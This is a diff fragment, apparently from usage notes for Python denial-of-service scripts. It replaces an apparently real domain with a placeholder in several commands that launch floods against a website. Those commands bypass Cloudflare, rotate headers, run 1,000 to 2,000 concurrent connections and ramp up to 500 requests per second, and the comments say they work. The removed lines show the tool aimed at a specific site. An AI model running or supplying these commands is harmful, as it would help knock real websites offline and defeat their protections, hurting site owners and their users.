@@ -27,13 +27,13 @@ python3 ddosv2_cf_bypass.py \
 
 v4
 # Basic (No error)
-python3 ddosv4.py --url https://genggi.com --bypass-cloudflare --rotate-headers --concurrency 1000 --ramp 50,100,150,200 --stage-duration 3 --retries 0 --no-dashboard --no-ssl-verify
+python3 ddosv4.py --url https://target-site.com --bypass-cloudflare --rotate-headers --concurrency 1000 --ramp 50,100,150,200 --stage-duration 3 --retries 0 --no-dashboard --no-ssl-verify
 
 # With 300 RPS (Working na!)
-python3 ddosv4.py --url https://genggi.com --bypass-cloudflare --rotate-headers --concurrency 1000 --ramp 100,200,300 --stage-duration 3 --retries 0 --no-dashboard --no-ssl-verify
+python3 ddosv4.py --url https://target-site.com --bypass-cloudflare --rotate-headers --concurrency 1000 --ramp 100,200,300 --stage-duration 3 --retries 0 --no-dashboard --no-ssl-verify
 
 # Higher RPS (500)
-python3 ddosv4.py --url https://genggi.com --bypass-cloudflare --rotate-headers --concurrency 1000 --ramp 100,200,300,400,500 --stage-duration 3 --retries 0 --no-dashboard --no-ssl-verify
+python3 ddosv4.py --url https://target-site.com --bypass-cloudflare --rotate-headers --concurrency 1000 --ramp 100,200,300,400,500 --stage-duration 3 --retries 0 --no-dashboard --no-ssl-verify
 
 # Super Fast
-python3 ddosv4.py --url https://genggi.com --bypass-cloudflare --rotate-headers --concurrency 2000 --ramp 200,300,400,500 --stage-duration 2 --retries 0 --warmup 0 --no-dashboard --no-ssl-verify
+python3 ddosv4.py --url https://target-site.com --bypass-cloudflare --rotate-headers --concurrency 2000 --ramp 200,300,400,500 --stage-duration 2 --retries 0 --warmup 0 --no-dashboard --no-ssl-verify
